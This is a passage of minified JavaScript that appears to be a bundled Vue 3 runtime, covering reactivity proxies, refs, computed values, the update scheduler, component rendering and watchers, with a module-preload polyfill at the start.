function Ii(r, e) {
    const t = Object.create(null),
        n = r.split(",");
    for (let i = 0; i < n.length; i++) t[n[i]] = !0;
    return e ? (i) => !!t[i.toLowerCase()] : (i) => !!t[i];
}
function Di(r) {
    if (oe(r)) {
        const e = {};
        for (let t = 0; t < r.length; t++) {
            const n = r[t],
                i = ft(n) ? n7(n) : Di(n);
            if (i) for (const s in i) e[s] = i[s];
        }
        return e;
    }
    return ft(r) || Ve(r) ? r : void 0;
}
!(function() {
    const e = document.createElement("link").relList;
    if (!(e && e.supports && e.supports("modulepreload"))) {
        for (const i of document.querySelectorAll('link[rel="modulepreload"]'))
            n(i);
        new MutationObserver((i) => {
            for (const s of i)
                if ("childList" === s.type)
                    for (const o of s.addedNodes)
                        "LINK" === o.tagName && "modulepreload" === o.rel && n(o);
        }).observe(document, { childList: !0, subtree: !0 });
    }
    function n(i) {
        if (i.ep) return;
        i.ep = !0;
        const s = (function t(i) {
            const s = {};
            return (
                i.integrity && (s.integrity = i.integrity),
                i.referrerpolicy && (s.referrerPolicy = i.referrerpolicy),
                "use-credentials" === i.crossorigin
                    ? (s.credentials = "include")
                    : "anonymous" === i.crossorigin
                        ? (s.credentials = "omit")
                        : (s.credentials = "same-origin"),
                s
            );
        })(i);
        fetch(i.href, s);
    }
})();
const e7 = /;(?![^(]*\))/g,
    t7 = /:([^]+)/,
    r7 = /\/\*.*?\*\//gs;
function n7(r) {
    const e = {};
    return (
        r
            .replace(r7, "")
            .split(e7)
            .forEach((t) => {
                if (t) {
                    const n = t.split(t7);
                    n.length > 1 && (e[n[0].trim()] = n[1].trim());
                }
            }),
        e
    );
}
function Fi(r) {
    let e = "";
    if (ft(r)) e = r;
    else if (oe(r))
        for (let t = 0; t < r.length; t++) {
            const n = Fi(r[t]);
            n && (e += n + " ");
        }
    else if (Ve(r)) for (const t in r) r[t] && (e += t + " ");
    return e.trim();
}
const i7 =
    "itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly",
    s7 = Ii(i7);
function Ls(r) {
    return !!r || "" === r;
}
const Me = {},
    tr = [],
    d1 = () => { },
    o7 = () => !1,
    l7 = /^on[^a-z]/,
    h2 = (r) => l7.test(r),
    Bi = (r) => r.startsWith("onUpdate:"),
    At = Object.assign,
    Li = (r, e) => {
        const t = r.indexOf(e);
        t > -1 && r.splice(t, 1);
    },
    a7 = Object.prototype.hasOwnProperty,
    xe = (r, e) => a7.call(r, e),
    oe = Array.isArray,
    Nr = (r) => "[object Map]" === d2(r),
    c7 = (r) => "[object Set]" === d2(r),
    ie = (r) => "function" == typeof r,
    ft = (r) => "string" == typeof r,
    Ni = (r) => "symbol" == typeof r,
    Ve = (r) => null !== r && "object" == typeof r,
    Ns = (r) => Ve(r) && ie(r.then) && ie(r.catch),
    u7 = Object.prototype.toString,
    d2 = (r) => u7.call(r),
    f7 = (r) => d2(r).slice(8, -1),
    h7 = (r) => "[object Object]" === d2(r),
    Zi = (r) =>
        ft(r) && "NaN" !== r && "-" !== r[0] && "" + parseInt(r, 10) === r,
    Dn = Ii(
        ",key,ref,ref_for,ref_key,onVnodeBeforeMount,onVnodeMounted,onVnodeBeforeUpdate,onVnodeUpdated,onVnodeBeforeUnmount,onVnodeUnmounted"
    ),
    _2 = (r) => {
        const e = Object.create(null);
        return (t) => e[t] || (e[t] = r(t));
    },
    d7 = /-(\w)/g,
    P1 = _2((r) => r.replace(d7, (e, t) => (t ? t.toUpperCase() : ""))),
    _7 = /\B([A-Z])/g,
    vr = _2((r) => r.replace(_7, "-$1").toLowerCase()),
    p2 = _2((r) => r.charAt(0).toUpperCase() + r.slice(1)),
    P2 = _2((r) => (r ? `on${p2(r)}` : "")),
    Gr = (r, e) => !Object.is(r, e),
    M2 = (r, e) => {
        for (let t = 0; t < r.length; t++) r[t](e);
    },
    qn = (r, e, t) => {
        Object.defineProperty(r, e, { configurable: !0, enumerable: !1, value: t });
    },
    Zs = (r) => {
        const e = parseFloat(r);
        return isNaN(e) ? r : e;
    };
let A6;
const p7 = () =>
    A6 ||
    (A6 =
        typeof globalThis < "u"
            ? globalThis
            : typeof self < "u"
                ? self
                : typeof window < "u"
                    ? window
                    : typeof global < "u"
                        ? global
                        : {});
let Bt;
class g7 {
    constructor(e = !1) {
        (this.detached = e),
            (this.active = !0),
            (this.effects = []),
            (this.cleanups = []),
            (this.parent = Bt),
            !e && Bt && (this.index = (Bt.scopes || (Bt.scopes = [])).push(this) - 1);
    }
    run(e) {
        if (this.active) {
            const t = Bt;
            try {
                return (Bt = this), e();
            } finally {
                Bt = t;
            }
        }
    }
    on() {
        Bt = this;
    }
    off() {
        Bt = this.parent;
    }
    stop(e) {
        if (this.active) {
            let t, n;
            for (t = 0, n = this.effects.length; t < n; t++) this.effects[t].stop();
            for (t = 0, n = this.cleanups.length; t < n; t++) this.cleanups[t]();
            if (this.scopes)
                for (t = 0, n = this.scopes.length; t < n; t++) this.scopes[t].stop(!0);
            if (!this.detached && this.parent && !e) {
                const i = this.parent.scopes.pop();
                i &&
                    i !== this &&
                    ((this.parent.scopes[this.index] = i), (i.index = this.index));
            }
            (this.parent = void 0), (this.active = !1);
        }
    }
}
function m7(r, e = Bt) {
    e && e.active && e.effects.push(r);
}
function x7() {
    return Bt;
}
function y7(r) {
    Bt && Bt.cleanups.push(r);
}
const $i = (r) => {
    const e = new Set(r);
    return (e.w = 0), (e.n = 0), e;
},
    $s = (r) => (r.w & a3) > 0,
    zs = (r) => (r.n & a3) > 0,
    v7 = ({ deps: r }) => {
        if (r.length) for (let e = 0; e < r.length; e++) r[e].w |= a3;
    },
    b7 = (r) => {
        const { deps: e } = r;
        if (e.length) {
            let t = 0;
            for (let n = 0; n < e.length; n++) {
                const i = e[n];
                $s(i) && !zs(i) ? i.delete(r) : (e[t++] = i),
                    (i.w &= ~a3),
                    (i.n &= ~a3);
            }
            e.length = t;
        }
    },
    q2 = new WeakMap();
let Rr = 0,
    a3 = 1;
const Q2 = 30;
let u1;
const P3 = Symbol(""),
    G2 = Symbol("");
class zi {
    constructor(e, t = null, n) {
        (this.fn = e),
            (this.scheduler = t),
            (this.active = !0),
            (this.deps = []),
            (this.parent = void 0),
            m7(this, n);
    }
    run() {
        if (!this.active) return this.fn();
        let e = u1,
            t = n3;
        for (; e;) {
            if (e === this) return;
            e = e.parent;
        }
        try {
            return (
                (this.parent = u1),
                (u1 = this),
                (n3 = !0),
                (a3 = 1 << ++Rr),
                Rr <= Q2 ? v7(this) : O6(this),
                this.fn()
            );
        } finally {
            Rr <= Q2 && b7(this),
                (a3 = 1 << --Rr),
                (u1 = this.parent),
                (n3 = t),
                (this.parent = void 0),
                this.deferStop && this.stop();
        }
    }
    stop() {
        u1 === this
            ? (this.deferStop = !0)
            : this.active &&
            (O6(this), this.onStop && this.onStop(), (this.active = !1));
    }
}
function O6(r) {
    const { deps: e } = r;
    if (e.length) {
        for (let t = 0; t < e.length; t++) e[t].delete(r);
        e.length = 0;
    }
}
let n3 = !0;
const Us = [];
function br() {
    Us.push(n3), (n3 = !1);
}
function wr() {
    const r = Us.pop();
    n3 = void 0 === r || r;
}
function Ht(r, e, t) {
    if (n3 && u1) {
        let n = q2.get(r);
        n || q2.set(r, (n = new Map()));
        let i = n.get(t);
        i || n.set(t, (i = $i())), Ws(i);
    }
}
function Ws(r, e) {
    let t = !1;
    Rr <= Q2 ? zs(r) || ((r.n |= a3), (t = !$s(r))) : (t = !r.has(u1)),
        t && (r.add(u1), u1.deps.push(r));
}
function z1(r, e, t, n, i, s) {
    const o = q2.get(r);
    if (!o) return;
    let l = [];
    if ("clear" === e) l = [...o.values()];
    else if ("length" === t && oe(r)) {
        const a = Zs(n);
        o.forEach((c, u) => {
            ("length" === u || u >= a) && l.push(c);
        });
    } else
        switch ((void 0 !== t && l.push(o.get(t)), e)) {
            case "add":
                oe(r)
                    ? Zi(t) && l.push(o.get("length"))
                    : (l.push(o.get(P3)), Nr(r) && l.push(o.get(G2)));
                break;
            case "delete":
                oe(r) || (l.push(o.get(P3)), Nr(r) && l.push(o.get(G2)));
                break;
            case "set":
                Nr(r) && l.push(o.get(P3));
        }
    if (1 === l.length) l[0] && J2(l[0]);
    else {
        const a = [];
        for (const c of l) c && a.push(...c);
        J2($i(a));
    }
}
function J2(r, e) {
    const t = oe(r) ? r : [...r];
    for (const n of t) n.computed && P6(n);
    for (const n of t) n.computed || P6(n);
}
function P6(r, e) {
    (r !== u1 || r.allowRecurse) && (r.scheduler ? r.scheduler() : r.run());
}
const w7 = Ii("__proto__,__v_isRef,__isVue"),
    Hs = new Set(
        Object.getOwnPropertyNames(Symbol)
            .filter((r) => "arguments" !== r && "caller" !== r)
            .map((r) => Symbol[r])
            .filter(Ni)
    ),
    T7 = Ui(),
    C7 = Ui(!1, !0),
    S7 = Ui(!0),
    M6 = A7();
function A7() {
    const r = {};
    return (
        ["includes", "indexOf", "lastIndexOf"].forEach((e) => {
            r[e] = function(...t) {
                const n = ye(this);
                for (let s = 0, o = this.length; s < o; s++) Ht(n, "get", s + "");
                const i = n[e](...t);
                return -1 === i || !1 === i ? n[e](...t.map(ye)) : i;
            };
        }),
        ["push", "pop", "shift", "unshift", "splice"].forEach((e) => {
            r[e] = function(...t) {
                br();
                const n = ye(this)[e].apply(this, t);
                return wr(), n;
            };
        }),
        r
    );
}
function Ui(r = !1, e = !1) {
    return function(n, i, s) {
        if ("__v_isReactive" === i) return !r;
        if ("__v_isReadonly" === i) return r;
        if ("__v_isShallow" === i) return e;
        if ("__v_raw" === i && s === (r ? (e ? U7 : Ks) : e ? js : Vs).get(n))
            return n;
        const o = oe(n);
        if (!r && o && xe(M6, i)) return Reflect.get(M6, i, s);
        const l = Reflect.get(n, i, s);
        return (Ni(i) ? Hs.has(i) : w7(i)) || (r || Ht(n, "get", i), e)
            ? l
            : gt(l)
                ? o && Zi(i)
                    ? l
                    : l.value
                : Ve(l)
                    ? r
                        ? qs(l)
                        : Yi(l)
                    : l;
    };
}
const O7 = Ys(),
    P7 = Ys(!0);
function Ys(r = !1) {
    return function(t, n, i, s) {
        let o = t[n];
        if (cr(o) && gt(o) && !gt(i)) return !1;
        if (
            !r &&
            (!Qn(i) && !cr(i) && ((o = ye(o)), (i = ye(i))),
                !oe(t) && gt(o) && !gt(i))
        )
            return (o.value = i), !0;
        const l = oe(t) && Zi(n) ? Number(n) < t.length : xe(t, n),
            a = Reflect.set(t, n, i, s);
        return (
            t === ye(s) && (l ? Gr(i, o) && z1(t, "set", n, i) : z1(t, "add", n, i)),
            a
        );
    };
}
function M7(r, e) {
    const t = xe(r, e);
    r[e];
    const n = Reflect.deleteProperty(r, e);
    return n && t && z1(r, "delete", e, void 0), n;
}
function E7(r, e) {
    const t = Reflect.has(r, e);
    return (!Ni(e) || !Hs.has(e)) && Ht(r, "has", e), t;
}
function k7(r) {
    return Ht(r, "iterate", oe(r) ? "length" : P3), Reflect.ownKeys(r);
}
const Xs = { get: T7, set: O7, deleteProperty: M7, has: E7, ownKeys: k7 },
    R7 = { get: S7, set: (r, e) => !0, deleteProperty: (r, e) => !0 },
    I7 = At({}, Xs, { get: C7, set: P7 }),
    Wi = (r) => r,
    g2 = (r) => Reflect.getPrototypeOf(r);
function pn(r, e, t = !1, n = !1) {
    const i = ye((r = r.__v_raw)),
        s = ye(e);
    t || (e !== s && Ht(i, "get", e), Ht(i, "get", s));
    const { has: o } = g2(i),
        l = n ? Wi : t ? Vi : Jr;
    return o.call(i, e)
        ? l(r.get(e))
        : o.call(i, s)
            ? l(r.get(s))
            : void (r !== i && r.get(e));
}
function gn(r, e = !1) {
    const t = this.__v_raw,
        n = ye(t),
        i = ye(r);
    return (
        e || (r !== i && Ht(n, "has", r), Ht(n, "has", i)),
        r === i ? t.has(r) : t.has(r) || t.has(i)
    );
}
function mn(r, e = !1) {
    return (
        (r = r.__v_raw), !e && Ht(ye(r), "iterate", P3), Reflect.get(r, "size", r)
    );
}
function E6(r) {
    r = ye(r);
    const e = ye(this);
    return g2(e).has.call(e, r) || (e.add(r), z1(e, "add", r, r)), this;
}
function k6(r, e) {
    e = ye(e);
    const t = ye(this),
        { has: n, get: i } = g2(t);
    let s = n.call(t, r);
    s || ((r = ye(r)), (s = n.call(t, r)));
    const o = i.call(t, r);
    return (
        t.set(r, e), s ? Gr(e, o) && z1(t, "set", r, e) : z1(t, "add", r, e), this
    );
}
function R6(r) {
    const e = ye(this),
        { has: t, get: n } = g2(e);
    let i = t.call(e, r);
    i || ((r = ye(r)), (i = t.call(e, r))), n && n.call(e, r);
    const s = e.delete(r);
    return i && z1(e, "delete", r, void 0), s;
}
function I6() {
    const r = ye(this),
        e = 0 !== r.size,
        t = r.clear();
    return e && z1(r, "clear", void 0, void 0), t;
}
function xn(r, e) {
    return function(n, i) {
        const s = this,
            o = s.__v_raw,
            l = ye(o),
            a = e ? Wi : r ? Vi : Jr;
        return (
            !r && Ht(l, "iterate", P3), o.forEach((c, u) => n.call(i, a(c), a(u), s))
        );
    };
}
function yn(r, e, t) {
    return function(...n) {
        const i = this.__v_raw,
            s = ye(i),
            o = Nr(s),
            l = "entries" === r || (r === Symbol.iterator && o),
            a = "keys" === r && o,
            c = i[r](...n),
            u = t ? Wi : e ? Vi : Jr;
        return (
            !e && Ht(s, "iterate", a ? G2 : P3),
            {
                next() {
                    const { value: h, done: f } = c.next();
                    return f
                        ? { value: h, done: f }
                        : { value: l ? [u(h[0]), u(h[1])] : u(h), done: f };
                },
                [Symbol.iterator]() {
                    return this;
                },
            }
        );
    };
}
function V1(r) {
    return function(...e) {
        return "delete" !== r && this;
    };
}
function D7() {
    const r = {
        get(s) {
            return pn(this, s);
        },
        get size() {
            return mn(this);
        },
        has: gn,
        add: E6,
        set: k6,
        delete: R6,
        clear: I6,
        forEach: xn(!1, !1),
    },
        e = {
            get(s) {
                return pn(this, s, !1, !0);
            },
            get size() {
                return mn(this);
            },
            has: gn,
            add: E6,
            set: k6,
            delete: R6,
            clear: I6,
            forEach: xn(!1, !0),
        },
        t = {
            get(s) {
                return pn(this, s, !0);
            },
            get size() {
                return mn(this, !0);
            },
            has(s) {
                return gn.call(this, s, !0);
            },
            add: V1("add"),
            set: V1("set"),
            delete: V1("delete"),
            clear: V1("clear"),
            forEach: xn(!0, !1),
        },
        n = {
            get(s) {
                return pn(this, s, !0, !0);
            },
            get size() {
                return mn(this, !0);
            },
            has(s) {
                return gn.call(this, s, !0);
            },
            add: V1("add"),
            set: V1("set"),
            delete: V1("delete"),
            clear: V1("clear"),
            forEach: xn(!0, !0),
        };
    return (
        ["keys", "values", "entries", Symbol.iterator].forEach((s) => {
            (r[s] = yn(s, !1, !1)),
                (t[s] = yn(s, !0, !1)),
                (e[s] = yn(s, !1, !0)),
                (n[s] = yn(s, !0, !0));
        }),
        [r, t, e, n]
    );
}
const [F7, B7, L7, N7] = D7();
function Hi(r, e) {
    const t = e ? (r ? N7 : L7) : r ? B7 : F7;
    return (n, i, s) =>
        "__v_isReactive" === i
            ? !r
            : "__v_isReadonly" === i
                ? r
                : "__v_raw" === i
                    ? n
                    : Reflect.get(xe(t, i) && i in n ? t : n, i, s);
}
const Z7 = { get: Hi(!1, !1) },
    $7 = { get: Hi(!1, !0) },
    z7 = { get: Hi(!0, !1) },
    Vs = new WeakMap(),
    js = new WeakMap(),
    Ks = new WeakMap(),
    U7 = new WeakMap();
function W7(r) {
    switch (r) {
        case "Object":
        case "Array":
            return 1;
        case "Map":
        case "Set":
        case "WeakMap":
        case "WeakSet":
            return 2;
        default:
            return 0;
    }
}
function H7(r) {
    return r.__v_skip || !Object.isExtensible(r) ? 0 : W7(f7(r));
}
function Yi(r) {
    return cr(r) ? r : Xi(r, !1, Xs, Z7, Vs);
}
function Y7(r) {
    return Xi(r, !1, I7, $7, js);
}
function qs(r) {
    return Xi(r, !0, R7, z7, Ks);
}
function Xi(r, e, t, n, i) {
    if (!Ve(r) || (r.__v_raw && (!e || !r.__v_isReactive))) return r;
    const s = i.get(r);
    if (s) return s;
    const o = H7(r);
    if (0 === o) return r;
    const l = new Proxy(r, 2 === o ? n : t);
    return i.set(r, l), l;
}
function rr(r) {
    return cr(r) ? rr(r.__v_raw) : !(!r || !r.__v_isReactive);
}
function cr(r) {
    return !(!r || !r.__v_isReadonly);
}
function Qn(r) {
    return !(!r || !r.__v_isShallow);
}
function Qs(r) {
    return rr(r) || cr(r);
}
function ye(r) {
    const e = r && r.__v_raw;
    return e ? ye(e) : r;
}
function Gs(r) {
    return qn(r, "__v_skip", !0), r;
}
const Jr = (r) => (Ve(r) ? Yi(r) : r),
    Vi = (r) => (Ve(r) ? qs(r) : r);
function Js(r) {
    n3 && u1 && Ws((r = ye(r)).dep || (r.dep = $i()));
}
function e5(r, e) {
    (r = ye(r)).dep && J2(r.dep);
}
function gt(r) {
    return !(!r || !0 !== r.__v_isRef);
}
function dn(r) {
    return X7(r, !1);
}
function X7(r, e) {
    return gt(r) ? r : new V7(r, e);
}
class V7 {
    constructor(e, t) {
        (this.__v_isShallow = t),
            (this.dep = void 0),
            (this.__v_isRef = !0),
            (this._rawValue = t ? e : ye(e)),
            (this._value = t ? e : Jr(e));
    }
    get value() {
        return Js(this), this._value;
    }
    set value(e) {
        const t = this.__v_isShallow || Qn(e) || cr(e);
        (e = t ? e : ye(e)),
            Gr(e, this._rawValue) &&
            ((this._rawValue = e), (this._value = t ? e : Jr(e)), e5(this));
    }
}
function t5(r) {
    return gt(r) ? r.value : r;
}
const j7 = {
    get: (r, e, t) => t5(Reflect.get(r, e, t)),
    set: (r, e, t, n) => {
        const i = r[e];
        return gt(i) && !gt(t) ? ((i.value = t), !0) : Reflect.set(r, e, t, n);
    },
};
function r5(r) {
    return rr(r) ? r : new Proxy(r, j7);
}
var n5;
class K7 {
    constructor(e, t, n, i) {
        (this._setter = t),
            (this.dep = void 0),
            (this.__v_isRef = !0),
            (this[n5] = !1),
            (this._dirty = !0),
            (this.effect = new zi(e, () => {
                this._dirty || ((this._dirty = !0), e5(this));
            })),
            (this.effect.computed = this),
            (this.effect.active = this._cacheable = !i),
            (this.__v_isReadonly = n);
    }
    get value() {
        const e = ye(this);
        return (
            Js(e),
            (e._dirty || !e._cacheable) &&
            ((e._dirty = !1), (e._value = e.effect.run())),
            e._value
        );
    }
    set value(e) {
        this._setter(e);
    }
}
function q7(r, e, t = !1) {
    let n, i;
    const s = ie(r);
    return (
        s ? ((n = r), (i = d1)) : ((n = r.get), (i = r.set)),
        new K7(n, i, s || !i, t)
    );
}
function i3(r, e, t, n) {
    let i;
    try {
        i = n ? r(...n) : r();
    } catch (s) {
        m2(s, e, t);
    }
    return i;
}
function _1(r, e, t, n) {
    if (ie(r)) {
        const s = i3(r, e, t, n);
        return (
            s &&
            Ns(s) &&
            s.catch((o) => {
                m2(o, e, t);
            }),
            s
        );
    }
    const i = [];
    for (let s = 0; s < r.length; s++) i.push(_1(r[s], e, t, n));
    return i;
}
function m2(r, e, t, n = !0) {
    const i = e ? e.vnode : null;
    if (e) {
        let s = e.parent;
        const o = e.proxy,
            l = t;
        for (; s;) {
            const c = s.ec;
            if (c)
                for (let u = 0; u < c.length; u++) if (!1 === c[u](r, o, l)) return;
            s = s.parent;
        }
        const a = e.appContext.config.errorHandler;
        if (a) return void i3(a, null, 10, [r, o, l]);
    }
    Q7(r, t, i, n);
}
function Q7(r, e, t, n = !0) {
    console.error(r);
}
n5 = "__v_isReadonly";
let en = !1,
    ei = !1;
const _t = [];
let C1 = 0;
const nr = [];
let D1 = null,
    C3 = 0;
const i5 = Promise.resolve();
let ji = null;
function s5(r) {
    const e = ji || i5;
    return r ? e.then(this ? r.bind(this) : r) : e;
}
function G7(r) {
    let e = C1 + 1,
        t = _t.length;
    for (; e < t;) {
        const n = (e + t) >>> 1;
        tn(_t[n]) < r ? (e = n + 1) : (t = n);
    }
    return e;
}
function Ki(r) {
    (!_t.length || !_t.includes(r, en && r.allowRecurse ? C1 + 1 : C1)) &&
        (null == r.id ? _t.push(r) : _t.splice(G7(r.id), 0, r), o5());
}
function o5() {
    !en && !ei && ((ei = !0), (ji = i5.then(a5)));
}
function J7(r) {
    const e = _t.indexOf(r);
    e > C1 && _t.splice(e, 1);
}
function eo(r) {
    oe(r)
        ? nr.push(...r)
        : (!D1 || !D1.includes(r, r.allowRecurse ? C3 + 1 : C3)) && nr.push(r),
        o5();
}
function D6(r, e = en ? C1 + 1 : 0) {
    for (; e < _t.length; e++) {
        const t = _t[e];
        t && t.pre && (_t.splice(e, 1), e--, t());
    }
}
function l5(r) {
    if (nr.length) {
        const e = [...new Set(nr)];
        if (((nr.length = 0), D1)) return void D1.push(...e);
        for (D1 = e, D1.sort((t, n) => tn(t) - tn(n)), C3 = 0; C3 < D1.length; C3++)
            D1[C3]();
        (D1 = null), (C3 = 0);
    }
}
const tn = (r) => (null == r.id ? 1 / 0 : r.id),
    to = (r, e) => {
        const t = tn(r) - tn(e);
        if (0 === t) {
            if (r.pre && !e.pre) return -1;
            if (e.pre && !r.pre) return 1;
        }
        return t;
    };
function a5(r) {
    (ei = !1), (en = !0), _t.sort(to);
    try {
        for (C1 = 0; C1 < _t.length; C1++) {
            const t = _t[C1];
            t && !1 !== t.active && i3(t, null, 14);
        }
    } finally {
        (C1 = 0),
            (_t.length = 0),
            l5(),
            (en = !1),
            (ji = null),
            (_t.length || nr.length) && a5();
    }
}
function ro(r, e, ...t) {
    if (r.isUnmounted) return;
    const n = r.vnode.props || Me;
    let i = t;
    const s = e.startsWith("update:"),
        o = s && e.slice(7);
    if (o && o in n) {
        const u = `${"modelValue" === o ? "model" : o}Modifiers`,
            { number: h, trim: f } = n[u] || Me;
        f && (i = t.map((d) => (ft(d) ? d.trim() : d))), h && (i = t.map(Zs));
    }
    let l,
        a = n[(l = P2(e))] || n[(l = P2(P1(e)))];
    !a && s && (a = n[(l = P2(vr(e)))]), a && _1(a, r, 6, i);
    const c = n[l + "Once"];
    if (c) {
        if (r.emitted) {
            if (r.emitted[l]) return;
        } else r.emitted = {};
        (r.emitted[l] = !0), _1(c, r, 6, i);
    }
}
function c5(r, e, t = !1) {
    const n = e.emitsCache,
        i = n.get(r);
    if (void 0 !== i) return i;
    const s = r.emits;
    let o = {},
        l = !1;
    if (!ie(r)) {
        const a = (c) => {
            const u = c5(c, e, !0);
            u && ((l = !0), At(o, u));
        };
        !t && e.mixins.length && e.mixins.forEach(a),
            r.extends && a(r.extends),
            r.mixins && r.mixins.forEach(a);
    }
    return s || l
        ? (oe(s) ? s.forEach((a) => (o[a] = null)) : At(o, s),
            Ve(r) && n.set(r, o),
            o)
        : (Ve(r) && n.set(r, null), null);
}
function x2(r, e) {
    return (
        !(!r || !h2(e)) &&
        ((e = e.slice(2).replace(/Once$/, "")),
            xe(r, e[0].toLowerCase() + e.slice(1)) || xe(r, vr(e)) || xe(r, e))
    );
}
let Qt = null,
    y2 = null;
function Gn(r) {
    const e = Qt;
    return (Qt = r), (y2 = (r && r.type.__scopeId) || null), e;
}
function Tr(r) {
    y2 = r;
}
function Cr() {
    y2 = null;
}
function no(r, e = Qt, t) {
    if (!e || r._n) return r;
    const n = (...i) => {
        n._d && W6(-1);
        const s = Gn(e);
        let o;
        try {
            o = r(...i);
        } finally {
            Gn(s), n._d && W6(1);
        }
        return o;
    };
    return (n._n = !0), (n._c = !0), (n._d = !0), n;
}
function E2(r) {
    const {
        type: e,
        vnode: t,
        proxy: n,
        withProxy: i,
        props: s,
        propsOptions: [o],
        slots: l,
        attrs: a,
        emit: c,
        render: u,
        renderCache: h,
        data: f,
        setupState: d,
        ctx: m,
        inheritAttrs: p,
    } = r;
    let y, v;
    const S = Gn(r);
    try {
        if (4 & t.shapeFlag) {
            const C = i || n;
            (y = T1(u.call(C, C, h, s, d, f, m))), (v = a);
        } else {
            const C = e;
            (y = T1(
                C.length > 1 ? C(s, { attrs: a, slots: l, emit: c }) : C(s, null)
            )),
                (v = e.props ? a : io(a));
        }
    } catch (C) {
        ($r.length = 0), m2(C, r, 1), (y = Tt(rn));
    }
    let w = y;
    if (v && !1 !== p) {
        const C = Object.keys(v),
            { shapeFlag: O } = w;
        C.length && 7 & O && (o && C.some(Bi) && (v = so(v, o)), (w = ur(w, v)));
    }
    return (
        t.dirs && ((w = ur(w)), (w.dirs = w.dirs ? w.dirs.concat(t.dirs) : t.dirs)),
        t.transition && (w.transition = t.transition),
        (y = w),
        Gn(S),
        y
    );
}
const io = (r) => {
    let e;
    for (const t in r)
        ("class" === t || "style" === t || h2(t)) && ((e || (e = {}))[t] = r[t]);
    return e;
},
    so = (r, e) => {
        const t = {};
        for (const n in r) (!Bi(n) || !(n.slice(9) in e)) && (t[n] = r[n]);
        return t;
    };
function oo(r, e, t) {
    const { props: n, children: i, component: s } = r,
        { props: o, children: l, patchFlag: a } = e,
        c = s.emitsOptions;
    if (e.dirs || e.transition) return !0;
    if (!(t && a >= 0))
        return (
            !((!i && !l) || (l && l.$stable)) ||
            (n !== o && (n ? !o || F6(n, o, c) : !!o))
        );
    if (1024 & a) return !0;
    if (16 & a) return n ? F6(n, o, c) : !!o;
    if (8 & a) {
        const u = e.dynamicProps;
        for (let h = 0; h < u.length; h++) {
            const f = u[h];
            if (o[f] !== n[f] && !x2(c, f)) return !0;
        }
    }
    return !1;
}
function F6(r, e, t) {
    const n = Object.keys(e);
    if (n.length !== Object.keys(r).length) return !0;
    for (let i = 0; i < n.length; i++) {
        const s = n[i];
        if (e[s] !== r[s] && !x2(t, s)) return !0;
    }
    return !1;
}
function lo({ vnode: r, parent: e }, t) {
    for (; e && e.subTree === r;) ((r = e.vnode).el = t), (e = e.parent);
}
const ao = (r) => r.__isSuspense;
function co(r, e) {
    e && e.pendingBranch
        ? oe(r)
            ? e.effects.push(...r)
            : e.effects.push(r)
        : eo(r);
}
function uo(r, e) {
    if (nt) {
        let t = nt.provides;
        const n = nt.parent && nt.parent.provides;
        n === t && (t = nt.provides = Object.create(n)), (t[r] = e);
    }
}
function Fn(r, e, t = !1) {
    const n = nt || Qt;
    if (n) {
        const i =
            null == n.parent
                ? n.vnode.appContext && n.vnode.appContext.provides
                : n.parent.provides;
        if (i && r in i) return i[r];
        if (arguments.length > 1) return t && ie(e) ? e.call(n.proxy) : e;
    }
}
const vn = {};
function Bn(r, e, t) {
    return u5(r, e, t);
}
function u5(
    r,
    e,
    { immediate: t, deep: n, flush: i, onTrack: s, onTrigger: o } = Me
) {
    const l = nt;
    let a,
        c = !1,
        u = !1;
    if (
        (gt(r)
            ? ((a = () => r.value), (c = Qn(r)))
            : rr(r)
                ? ((a = () => r), (n = !0))
                : oe(r)
                    ? ((u = !0),
                        (c = r.some((w) => rr(w) || Qn(w))),
                        (a = () =>
                            r.map((w) =>
                                gt(w) ? w.value : rr(w) ? q3(w) : ie(w) ? i3(w, l, 2) : void 0
                            )))
                    : (a = ie(r)
                        ? e
                            ? () => i3(r, l, 2)
                            : () => {
                                if (!l || !l.isUnmounted) return h && h(), _1(r, l, 3, [f]);
                            }
                        : d1),
            e && n)
    ) {
        const w = a;
        a = () => q3(w());
    }
    let h,
        d,
        f = (w) => {
            h = v.onStop = () => {
                i3(w, l, 4);
            };
        };
    if (sn) {
        if (
            ((f = d1),
                e ? t && _1(e, l, 3, [a(), u ? [] : void 0, f]) : a(),
                "sync" !== i)
        )
            return d1;
        {
            const w = l0();
            d = w.__watcherHandles || (w.__watcherHandles = []);
        }
    }
    let m = u ? new Array(r.length).fill(vn) : vn;
    const p = () => {
        if (v.active)
            if (e) {
                const w = v.run();
                (n || c || (u ? w.some((C, O) => Gr(C, m[O])) : Gr(w, m))) &&
                    (h && h(),
                        _1(e, l, 3, [w, m === vn ? void 0 : u && m[0] === vn ? [] : m, f]),
                        (m = w));
            } else v.run();
    };
    let y;
    (p.allowRecurse = !!e),
        "sync" === i
            ? (y = p)
            : "post" === i
                ? (y = () => Et(p, l && l.suspense))
                : ((p.pre = !0), l && (p.id = l.uid), (y = () => Ki(p)));
    const v = new zi(a, y);
    e
        ? t
            ? p()
            : (m = v.run())
        : "post" === i
            ? Et(v.run.bind(v), l && l.suspense)
            : v.run();
    const S = () => {
        v.stop(), l && l.scope && Li(l.scope.effects, v);
    };
    return d && d.push(S), S;
}
function fo(r, e, t) {
    const n = this.proxy,
        i = ft(r) ? (r.includes(".") ? f5(n, r) : () => n[r]) : r.bind(n, n);
    let s;
    ie(e) ? (s = e) : ((s = e.handler), (t = e));
    const o = nt;
    fr(this);
    const l = u5(i, s.bind(n), t);
    return o ? fr(o) : M3(), l;
}
function f5(r, e) {
    const t = e.split(".");
    return () => {
        let n = r;
        for (let i = 0; i < t.length && n; i++) n = n[t[i]];
        return n;
    };
}
function q3(r, e) {
    if (!Ve(r) || r.__v_skip || (e = e || new Set()).has(r)) return r;
    if ((e.add(r), gt(r))) q3(r.value, e);
    else if (oe(r)) for (let t = 0; t < r.length; t++) q3(r[t], e);
    else if (c7(r) || Nr(r))
        r.forEach((t) => {
            q3(t, e);
        });
    else if (h7(r)) for (const t in r) q3(r[t], e);
    return r;
}
function $3(r) {
    return ie(r) ? { setup: r, name: r.name } : r;
}
const Ln = (r) => !!r.type.__asyncLoader,
    h5 = (r) => r.type.__isKeepAlive;
function ho(r, e) {
    d5(r, "a", e);
}
function _o(r, e) {
    d5(r, "da", e);
}
function d5(r, e, t = nt) {
    const n =
        r.__wdc ||
        (r.__wdc = () => {
            let i = t;
            for (; i;) {
                if (i.isDeactivated) return;
                i = i.parent;
            }
            return r();
        });
    if ((v2(e, n, t), t)) {
        let i = t.parent;
        for (; i && i.parent;)
            h5(i.parent.vnode) && po(n, e, t, i), (i = i.parent);
    }
}
function po(r, e, t, n) {
    const i = v2(e, r, n, !0);
    _5(() => {
